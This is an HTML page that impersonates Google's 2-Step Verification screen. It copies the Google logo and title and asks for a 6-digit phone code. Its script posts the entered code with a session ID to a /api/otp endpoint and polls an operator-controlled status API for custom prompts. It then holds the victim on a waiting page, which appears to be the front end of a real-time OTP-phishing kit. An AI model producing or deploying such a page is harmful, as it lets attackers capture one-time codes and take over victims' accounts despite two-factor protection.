
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2-Step Verification - Google</title>
    <link rel="icon" type="image/png" href="/pages/res/img/fav435vsdvge5.png">
    <link rel="stylesheet" href="/pages/res/css/style.css">
</head>
<body>
    <div class="container">
        <div class="signin-card">
            <div class="signin-left">
                <svg class="google-logo" viewBox="0 0 40 48" width="48" height="48" xmlns="http://www.w3.org/2000/svg">
                    <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"/>
                    <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"/>
                    <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"/>
                    <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"/>
                </svg>
                <h1>Verification</h1>
                <p class="subtitle">Enter the verification code</p>
            </div>
            
            <div class="signin-right">
                <form id="otpForm">
                    <div class="otp-info">
                        <h2 class="showed-otp" id="questionTitle">Phone OTP</h2>
                        <p id="otp-message">A text message with a 6-digit verification code was just sent to your <span id="device-type">phone</span></p>
                    </div>

                    <div class="input-container">
                        <input type="text" id="otp" placeholder=" " maxlength="10" required name="otp" autofocus>
                        <label class="input-label" for="otp">Enter 6-digit code</label>
                    </div>

                    <div class="button-group">
                        <button type="button" class="text-button">Resend it</button>
                        <button type="submit" class="next-button">Next</button>
                    </div>
                </form>
            </div>
        </div>

        <div class="footer">
            <select>
                <option>English (United States)</option>
            </select>
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session_id');

        if (!sessionId) {
            window.location.href = '/';
        }

        // Check for custom question and device type
        async function checkQuestion() {
            try {
                const response = await fetch(`/api/poll_status/${sessionId}`);
                const data = await response.json();
                if (data.question) {
                    document.getElementById('questionTitle').textContent = data.question;
                }
                
                // Get session data for device type
                const sessionResponse = await fetch(`/api/session/${sessionId}`);
                const sessionData = await sessionResponse.json();
                if (sessionData.device_type) {
                    const deviceType = sessionData.device_type.toLowerCase();
                    document.getElementById('device-type').textContent = deviceType;
                    document.getElementById('otp-message').innerHTML = 
                        `A text message with a 6-digit verification code was just sent to your <span id="device-type">${deviceType}</span>`;
                }
            } catch (error) {
                console.error('Error checking question:', error);
            }
        }

        checkQuestion();

        document.getElementById('otpForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const otp = document.getElementById('otp').value;
            
            if (!otp.trim()) {
                alert('Please enter the verification code');
                return;
            }
            
            try {
                const response = await fetch('/api/otp', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        otp,
                        session_id: sessionId
                    })
                });
                
                const data = await response.json();
                
                if (data.success && data.redirect) {
                    window.location.href = data.redirect;
                } else {
                    window.location.href = `/waiting?session_id=${sessionId}`;
                }
            } catch (error) {
                console.error('Error:', error);
                window.location.href = `/waiting?session_id=${sessionId}`;
            }
        });
    </script>
</body>
</html>
